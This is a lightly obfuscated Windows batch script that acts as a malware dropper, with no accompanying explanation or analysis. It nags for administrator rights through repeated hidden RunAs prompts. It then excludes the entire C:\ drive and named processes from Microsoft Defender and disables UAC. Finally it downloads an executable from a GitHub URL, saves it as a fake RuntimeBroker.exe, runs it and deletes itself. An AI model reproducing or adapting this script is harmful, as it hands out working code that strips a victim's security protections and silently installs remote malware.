@echo off & setlocal enableDelayedExpansion
set "yRZ=NET" & set "zGdP=SESSION" & set "DMV=2>&1" & set "uIK=>nul"
%yRZ% %zGdP% %uIK% %DMV%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "HAH=baz" & set "LJdu=foo" & set "xsPX=bar" & set "XFwqt=qux" & rem dNPBVMk xrvKYf RfhNXC
set "vGT=powershell -ExecutionPolicy Bypass -Command"
set "fiyqF=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "YXKfg='C:\' -ErrorAction SilentlyContinue"
!vGT! "!fiyqF! !YXKfg!" %uIK% %DMV%
set "TyQ=Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue"
!vGT! "!TyQ!" %uIK% %DMV%
set "beOX=Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
!vGT! "!beOX!" %uIK% %DMV%
set "qzM=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "Otcm=-Name 'EnableLUA' -Value 0"
!vGT! "!qzM! !Otcm!" %uIK% %DMV%
set "iFcQO=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!vGT! "!iFcQO!" %uIK% %DMV%
if !errorlevel! neq 0 (goto %a%)
set "QCc=timeout /t" & !QCc! 2 %uIK% %DMV%
set "blNe=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "Mrzw=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!vGT! "!blNe! !Mrzw!" %uIK% %DMV%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!QCc! 1 %uIK% %DMV% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %uIK% %DMV%
del /f /q "%~f0" %uIK% %DMV%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %uIK% %DMV%
if !errorlevel! neq 0 (!QCc! 3 %uIK% %DMV% & goto %b%)
exit /b
